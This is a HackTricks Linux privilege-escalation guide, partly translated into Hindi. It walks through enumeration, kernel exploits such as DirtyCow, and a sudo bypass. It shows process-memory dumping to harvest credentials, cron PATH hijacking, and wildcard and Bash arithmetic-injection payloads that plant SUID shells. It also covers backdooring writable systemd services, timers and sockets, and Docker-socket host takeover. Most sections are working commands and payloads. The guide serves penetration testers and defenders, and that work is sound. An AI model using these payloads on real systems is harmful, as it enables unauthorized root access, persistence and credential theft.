# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS जानकारी

चल रहे OS के बारे में जानकारी इकट्ठा करना शुरू करें
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **have write permissions on any folder inside the `PATH`** variable रखते हैं, तो आप कुछ libraries या binaries hijack कर सकते हैं:
```bash
echo $PATH
```
### Env info

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version जांचें और देखें कि कोई exploit है जो privileges escalate करने के लिए इस्तेमाल किया जा सकता है।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप एक अच्छी vulnerable kernel सूची और कुछ पहले से **compiled exploits** यहाँ पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
टूल्स जो kernel exploits खोजने में मदद कर सकते हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim में execute करें, केवल kernel 2.x के लिए exploits चेक करता है)

हमेशा **Google में kernel version खोजें**, शायद आपका kernel version किसी kernel exploit में लिखा हो और तब आप निश्चित हो सकेंगे कि यह exploit वैध है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

निम्न में दिखाई देने वाले कमजोर sudo संस्करणों के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo संस्करण vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

द्वारा @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

देखें **smasher2 box of HTB** इस बात का एक **उदाहरण** कि इस vuln का कैसे शोषण किया जा सकता है
```bash
dmesg 2>/dev/null | grep "signature"
```
### और system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपायों को सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप एक docker container के अंदर हैं तो आप उससे बाहर निकलने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँचें **कौन क्या mounted और unmounted है**, कहाँ और क्यों। यदि कुछ भी unmounted है तो आप उसे mount करने की कोशिश कर सकते हैं और निजी जानकारी के लिए जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही जाँचें कि **कोई compiler installed है**। यह उपयोगी होता है यदि आपको कोई kernel exploit इस्तेमाल करना पड़े क्योंकि सलाह दी जाती है कि उसे उसी मशीन पर compile किया जाए जहाँ आप इसे उपयोग करने वाले हैं (या किसी मिलती-जुलती मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### स्थापित कमजोर सॉफ़्टवेयर

इंस्टॉल किए गए packages और services के **version** की जाँच करें। शायद कोई पुराना Nagios version (उदाहरण के लिए) हो जो escalating privileges के लिए exploited किया जा सके…\
यह अनुशंसित है कि अधिक संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के version को मैन्युअल रूप से जाँचें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH access है, तो आप मशीन में इंस्टॉल किए गए पुराने और कमजोर सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड बहुत सारी जानकारी दिखाएँगे जो अधिकांशतः बेकार होगी, इसलिए OpenVAS या समान किसी एप्लिकेशन का उपयोग करना सुझाया जाता है जो जाँच सके कि कोई इंस्टॉल किया गया सॉफ़्टवेयर संस्करण ज्ञात exploits के लिए vulnerable तो नहीं है_

## Processes

देखें कि **कौन से प्रोसेस** चल रहे हैं और जाँचें कि कोई प्रोसेस अपेक्षित से **अधिक अधिकार** तो नहीं रखता (शायद कोई tomcat root द्वारा चल रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
सदैव [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) की जाँच करें। **Linpeas** उनको process की command line के अंदर `--inspect` parameter देखकर detect करता है।\
इसके अलावा **processes binaries** पर अपनी privileges भी जाँचें — शायद आप किसी को overwrite कर सकें।

### प्रोसेस मॉनिटरिंग

आप processes को monitor करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह अक्सर बार-बार execute होने वाले या जब किसी शर्त का सेट पूरा होता है उन vulnerable processes को पहचानने में बहुत उपयोगी हो सकता है।

### Process memory

किसी सर्वर की कुछ सेवाएँ memory के अंदर **credentials in clear text inside the memory** को save कर देती हैं।\
सामान्यतः आपको अन्य users के processes की memory पढ़ने के लिए **root privileges** की आवश्यकता होगी, इसलिए यह आम तौर पर तब अधिक उपयोगी होता है जब आप पहले से ही root हों और और अधिक credentials खोजना चाहें।\
हालाँकि, याद रखें कि **as a regular user you can read the memory of the processes you own**।

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनका uid समान हो। यह ptracing के पारंपरिक तरीके जैसा था।
> - **kernel.yama.ptrace_scope = 1**: केवल एक parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: ptrace के साथ किसी भी process को trace नहीं किया जा सकता। एक बार सेट होने पर ptracing को पुनः सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP service (उदाहरण के लिए) की memory तक पहुँच है तो आप Heap निकालकर उसके अंदर के credentials खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps यह दिखाती हैं कि उस process के वर्चुअल एड्रेस स्पेस में memory किस तरह mapped है**; यह यह भी बताती है कि **प्रत्येक mapped region की अनुमतियाँ (permissions) क्या हैं**। The **mem** pseudo file **खुद process की memory को उजागर करता है**। From the **maps** file हम जान लेते हैं कि कौन से **memory regions readable हैं** और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **mem file में seek करके सभी readable regions को एक फ़ाइल में dump करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी तक। कर्नेल के वर्चुअल address space तक /dev/kmem का उपयोग करके पहुँच बनाई जा सकती है.\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा पढ़ा जा सकता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump के लिए linux

ProcDump Windows के लिए Sysinternals suite के classic ProcDump tool की Linux पर पुनर्कल्पना है। इसे प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल्स

Process memory को dump करने के लिए आप इनका उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root requirements हटाकर आपके स्वामित्व वाले process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैन्युअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के अनुभागों को देखें जहाँ एक process की memory को dump करने के अलग‑अलग तरीके दिए गए हैं) और memory के अंदर credentials की खोज कर सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से और कुछ **well known files** से **clear text credentials** चोरी करेगा। यह सही तरीके से काम करने के लिए root privileges की आवश्यकता रखता है।

| विशेषता                                           | प्रोसेस नाम         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron jobs

जाँचें कि कोई scheduled job vulnerable है या नहीं। शायद आप उस script का फायदा उठा सकें जो root द्वारा execute किया जाता है (wildcard vuln? क्या आप उन files को modify कर सकते हैं जिन्हें root उपयोग करता है? symlinks का उपयोग? root द्वारा उपयोग की जाने वाली directory में specific files बना दें?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron पथ

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user उपयोगकर्ता के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab में root उपयोगकर्ता PATH सेट किए बिना कोई कमांड या स्क्रिप्ट चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप निम्नलिखित का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि कोई script root द्वारा execute की जा रही है और किसी command में “**\***” मौजूद है, तो आप इसे exploit करके अप्रत्याशित चीज़ें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path जैसे** _**/some/path/*** _** से पहले है, तो यह vulnerable नहीं है (यहाँ तक कि** _**./***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash parameter expansion और command substitution को arithmetic evaluation से पहले करता है ((...)), $((...)) और let में। यदि कोई root cron/parser untrusted log fields पढ़ता है और उन्हें arithmetic context में डालता है, तो attacker एक command substitution $(...) inject कर सकता है जो cron के चलने पर root के रूप में execute होगा।

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion। इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसे मान को पहले substitute किया जाता है (कमांड चलते हैं), फिर शेष numeric `0` arithmetic के लिए उपयोग होता है ताकि स्क्रिप्ट बिना error के आगे बढ़े।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log में attacker-controlled text लिखवाएँ ताकि numeric-looking field में एक command substitution हो और वह किसी digit पर end हो। सुनिश्चित करें कि आपका command stdout पर कुछ print न करे (या उसे redirect कर दें) ताकि arithmetic valid रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा चलाया गया script किसी ऐसी **directory where you have full access** का उपयोग करता है, तो उस folder को हटाकर और किसी अन्य पर **create a symlink folder to another one** बनाकर, जो आपके द्वारा नियंत्रित script को उपलब्ध कराता हो, यह उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### अक्सर चलने वाले cron jobs

आप प्रक्रियाओं की निगरानी कर सकते हैं ताकि उन प्रक्रियाओं को खोजा जा सके जो हर 1, 2 या 5 मिनट पर चल रही हैं। शायद आप इसका लाभ उठाकर escalate privileges कर सकें।

उदाहरण के लिए, **1 मिनट के दौरान हर 0.1s पर निगरानी करने के लिए**, **कम निष्पादित कमांड्स के अनुसार sort करने के लिए** और सबसे अधिक निष्पादित कमांड्स को हटाने के लिए, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप इसका भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर शुरू होने वाली प्रक्रिया को मॉनिटर करेगा और सूचीबद्ध करेगा).

### अदृश्य cron jobs

यह संभव है कि एक cronjob बनाया जा सकता है **comment के बाद carriage return डालकर** (बिना newline character), और cron job काम करेगा। उदाहरण (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

जांचें कि क्या आप किसी भी `.service` फ़ाइल को लिख सकते हैं, अगर कर सकते हैं, तो आप इसे **संशोधित** कर सकते हैं ताकि यह आपके **backdoor** को सेवा के **शुरू**, **पुनः आरंभ** या **बंद** होने पर **निष्पादित** करे (शायद आपको मशीन के रीबूट होने तक इंतजार करना पड़े)।\
उदाहरण के लिए अपनी backdoor .service फ़ाइल के अंदर बनाएं जैसे **`ExecStart=/tmp/script.sh`**

### Writable service binaries

ध्यान रखें कि अगर आपके पास उन बाइनरीज़ पर **write permissions over binaries being executed by services** हैं, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब services को फिर से चलाया जाए तो backdoors निष्पादित हो जाएँ।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को निम्न से देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप path के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप सम्भवतः **escalate privileges** कर पाएँगे। आपको service configuration फ़ाइलों में **relative paths being used on service configurations** की तलाश करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर जिसमें आप लिख सकते हैं, एक **executable** बनाएं जिसका नाम **same name as the relative path binary** के समान हो, और जब service से vulnerable action (**Start**, **Stop**, **Reload**) करने के लिए कहा जाएगा, तो आपका **backdoor will be executed** (unprivileged users आमतौर पर services start/stop नहीं कर सकते, लेकिन जाँचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में और अधिक जानने के लिए `man systemd.service` पढ़ें।**

## **Timers**

**Timers** systemd unit फाइलें हैं जिनका नाम `**.timer**` पर समाप्त होता है और जो `**.service**` फाइलों या इवेंट्स को नियंत्रित करती हैं। **Timers** को cron के वैकल्पिक के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in सपोर्ट होता है और इन्हें asynchronously चलाया जा सकता है।

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### लिखने योग्य timers

यदि आप किसी timer को संशोधित कर सकते हैं, तो आप इसे systemd.unit की कुछ मौजूदा इकाइयों (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
> उस unit को सक्रिय करने के लिए जो इस timer के समाप्त होने पर एक्टिवेट होगा। तर्क एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान default रूप से उस service का होगा जिसका नाम timer unit जैसा ही है, सिवाय suffix के। (ऊपर देखें।) यह अनुशंसित है कि जो unit नाम सक्रिय किया जाता है और timer unit का unit नाम, दोनों एक समान हों, सिवाय suffix के।
>
> 

अतः, इस permission का दुरुपयोग करने के लिए आपको निम्न करने की आवश्यकता होगी:

- कोई systemd unit (जैसे `.service`) खोजें जो **एक writable binary चला रहा हो**
- कोई systemd unit खोजें जो **एक relative path चला रहा हो** और आपके पास **systemd PATH** पर **writable privileges** हों (ताकि उस executable का impersonate किया जा सके)

**टाइमर्स के बारे में अधिक जानने के लिए `man systemd.timer` देखें।**

### **टाइमर सक्षम करना**

एक टाइमर सक्षम करने के लिए आपको root privileges चाहिए और निम्न को चलाना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
ध्यान दें कि **timer** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर उसका symlink बनाकर **activated** किया जाता है

## Sockets

Unix Domain Sockets (UDS) client-server मॉडल में एक ही या अलग मशीनों पर **process communication** को सक्षम करते हैं। ये इंटर-कम्प्यूटर कम्युनिकेशन के लिए मानक Unix descriptor फाइलों का उपयोग करते हैं और `.socket` फाइलों के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` फाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**Sockets के बारे में अधिक जानकारी के लिए `man systemd.socket` पढ़ें।** इस फ़ाइल के भीतर कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं, पर संक्षेप में ये यह **दर्शाते हैं कि यह socket कहाँ सुनने वाला है** (AF_UNIX socket फाइल का पथ, IPv4/6 और/या सुनने के लिए पोर्ट नंबर, आदि)।
- `Accept`: boolean argument लेता है। यदि **true**, तो प्रत्येक इनकमिंग कनेक्शन के लिए एक **service instance उत्पन्न** होता है और केवल कनेक्शन socket उसे पास किया जाता है। यदि **false**, तो सभी listening sockets खुद ही **start किए गए service unit को पास** किए जाते हैं, और सभी कनेक्शनों के लिए केवल एक service unit उत्पन्न होता है। यह मान datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक single service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को हैंडल करता है। **Defaults to false**। प्रदर्शन कारणों से, नए daemons को ऐसे ही लिखा जाना सुझाया जाता है कि वे `Accept=no` के अनुकूल हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेती हैं, जिन्हें listening **sockets**/FIFOs के **बनाए और bound किए जाने से पहले** या **बाद** क्रमशः execute किया जाता है। कमांड लाइन का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जिन्हें listening **sockets**/FIFOs के **बंद** और हटाए जाने से पहले या बाद क्रमशः execute किया जाता है।
- `Service`: इनकमिंग ट्रैफ़िक पर सक्रिय करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल Accept=no वाले sockets के लिए ही मान्य है। यह डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम socket के नाम जैसा ही होता है (suffix बदल कर)। अधिकांश मामलों में, इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आप कोई **writable** `.socket` फ़ाइल पाते हैं तो आप `[Socket]` सेक्शन की शुरुआत में कुछ इस तरह जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनाये जाने से पहले execute हो जाएगा। इसलिए, आपको **संभवतः मशीन के reboot होने तक इंतज़ार करना होगा।**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

यदि आप किसी भी **writable socket** की पहचान करते हैं (_अब हम Unix Sockets की बात कर रहे हैं और config `.socket` फाइलों की नहीं_), तो आप उस socket के साथ **communicate** कर सकते हैं और संभवतः किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets को सूचीबद्ध करें
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation उदाहरण:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा, बल्कि उन फाइलों की जो unix sockets के रूप में कार्य करती हैं_). आप इसे निम्न कमांड से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि सॉकेट **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद कुछ **exploit some vulnerability** कर सकें।

### लिखने योग्य Docker सॉकेट

Docker सॉकेट, जो अक्सर `/var/run/docker.sock` पर पाया जाता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित रखा जाना चाहिए। डिफ़ॉल्ट रूप से, यह `root` user और `docker` group के सदस्यों द्वारा writable होता है। इस सॉकेट पर write access होने से privilege escalation हो सकता है। नीचे बताया गया है कि यह कैसे किया जा सकता है और वैकल्पिक तरीके यदि Docker CLI उपलब्ध न हो तो।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker सॉकेट पर write access है, तो आप निम्न commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको होस्ट की फ़ाइल सिस्टम तक root-स्तर की पहुँच के साथ एक container चलाने की अनुमति देते हैं।

#### **Docker API का प्रत्यक्ष उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को Docker API और `curl` कमांड्स का उपयोग करके फिर भी हेरफेर किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** होस्ट सिस्टम की root directory को mount करने वाला एक container बनाने का request भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container से कनेक्शन स्थापित करें, जिससे उसके भीतर command execution सक्षम हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

socat कनेक्शन सेट करने के बाद, आप container के भीतर सीधे commands execute कर सकते हैं, जिनके पास होस्ट की filesystem पर root-level access होगा।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)। अगर [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

देखें **more ways to break out from docker or abuse it to escalate privileges** में:


{{#ref}}
docker-security/
{{#endref}}

